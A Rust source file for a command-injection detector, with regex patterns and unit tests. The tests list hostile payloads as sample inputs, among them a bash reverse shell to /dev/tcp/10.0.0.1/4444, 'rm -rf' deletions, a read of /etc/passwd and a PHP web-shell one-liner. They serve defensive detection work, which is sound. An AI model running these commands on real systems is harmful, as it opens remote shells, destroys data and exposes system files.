// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

use crate::{AttackCategory, DetectionResult, Detector, Severity};
use regex::Regex;
use std::sync::LazyLock;

static PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        Regex::new(r"`[^`]+`").unwrap(),
        Regex::new(r"\$\([^)]+\)").unwrap(),
        Regex::new(r"\|[\s]*\w+").unwrap(),
        Regex::new(r"\|\|[\s]*\w+").unwrap(),
        Regex::new(r"&&\s*\w+").unwrap(),
        Regex::new(r"/dev/tcp[/\w]*").unwrap(),
        Regex::new(r"(?i)passthru\s*\(").unwrap(),
        Regex::new(r"(?i)shell_exec\s*\(").unwrap(),
        Regex::new(r"(?i)system\s*\(").unwrap(),
        Regex::new(r"(?i)exec\s*\(").unwrap(),
        Regex::new(r"(?i)popen\s*\(").unwrap(),
        Regex::new(r"(?i)pcntl_exec\s*\(").unwrap(),
        Regex::new(r"(?i)cmd\.exe").unwrap(),
        Regex::new(r"(?i)powershell").unwrap(),
        Regex::new(r">/dev/null").unwrap(),
    ]
});

pub struct CommandInjectionDetector;

impl Detector for CommandInjectionDetector {
    fn name(&self) -> &'static str {
        "command_injection"
    }

    fn detect(&self, input: &str) -> Option<DetectionResult> {
        for re in PATTERNS.iter() {
            if let Some(m) = re.find(input) {
                return Some(DetectionResult {
                    attack_type: "command_injection".into(),
                    category: AttackCategory::Injection,
                    severity: Severity::Critical,
                    matched_pattern: m.as_str().to_string(),
                    offset: m.start(),
                    message: "Command injection detected".into(),
                });
            }
        }
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn det() -> CommandInjectionDetector {
        CommandInjectionDetector
    }

    fn assert_hit(input: &str) {
        let r = det()
            .detect(input)
            .expect("expected command injection detection");
        assert_eq!(r.attack_type, "command_injection");
        assert_eq!(r.category, AttackCategory::Injection);
        assert_eq!(r.severity, Severity::Critical);
        assert!(!r.matched_pattern.is_empty(), "matched_pattern empty");
        assert!(
            r.offset <= input.len(),
            "offset {} > len {}",
            r.offset,
            input.len()
        );
    }

    #[test]
    fn name_is_command_injection() {
        assert_eq!(det().name(), "command_injection");
    }

    #[test]
    fn detects_common_payloads() {
        for input in [
            "`cat /etc/passwd`",
            "$(rm -rf /)",
            "ls | grep passwd",
            "cd /tmp && rm -rf *",
            "bash -i >& /dev/tcp/10.0.0.1/4444",
            "php -r 'system($_GET[\"cmd\"]);'",
            "cmd.exe /c dir",
            "powershell -Command Get-Process",
        ] {
            assert_hit(input);
        }
    }

    #[test]
    fn benign_inputs_not_detected() {
        for input in [
            "Hello, this is a normal text input. Nothing suspicious here.",
            "The system is running normally",
            "I executed the plan successfully",
            "Pipes are used to join commands in unix",
            "Please run the update script",
        ] {
            assert!(det().detect(input).is_none(), "false positive: {input}");
        }
    }

    #[test]
    fn edge_cases() {
        assert!(det().detect("").is_none());
        assert!(det().detect(" \t\n ").is_none());
        assert!(det().detect("你好世界 こんにちは").is_none());
        // near misses: keyword present but not the payload form
        assert!(det().detect("system id").is_none());
        assert!(det().detect("rm -rf /").is_none());
        assert!(det().detect("cmd /c dir").is_none());
    }

    #[test]
    fn obfuscated_variants_detected() {
        for input in [
            "SYSTEM('id')",
            "Shell_Exec('id')",
            "PowerShell -Command Get-Process",
            "PASSTHRU('id')",
        ] {
            assert_hit(input);
        }
    }
}
